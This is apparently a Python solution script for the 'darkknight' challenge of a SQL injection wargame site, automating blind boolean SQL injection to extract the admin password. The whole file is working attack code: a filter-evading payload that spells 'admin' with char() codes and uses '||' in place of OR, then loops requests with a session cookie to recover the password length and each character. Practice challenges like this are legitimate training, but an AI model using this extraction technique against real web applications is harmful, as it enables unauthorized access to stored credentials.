import sys
import urllib
import requests


def get_ascii(param, idx):
    # ?pw=1&no=1||id%20like%20char(0x61,%200x64,%200x6d,%200x69,%200x6e)%20and%20not(length(pw)<>8)
    param = urllib.parse.quote(f"1||id like char(0x61,0x64,0x6d,0x69,0x6e) and not({param}")
    url = f"https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no="
    while(True):
        idx += 1
        data = f"{url}{param}<>{idx})%23"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
                , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
        cookie = {'PHPSESSID' : 'l9g226ba80aorqek0gqubmcqn2'}
        res = requests.get(data, headers=headers, cookies = cookie)
        if '<hr><br><h2>Hello admin</h2>' in res.text:
            return idx
        
    


def get_length(query):
    return get_ascii("length(%s)" % query, 0)

def get_content(query):
    content_len = get_length(query)
    content = ''
    # print(content_len)
    if content_len == 0:
        print('Invalid input')
        return ''
    if content_len == "error":
        print("Error")
        return "error"
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ord(right(left(%s,%d),1))' % (query, idx), 30))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



content = get_content('pw')
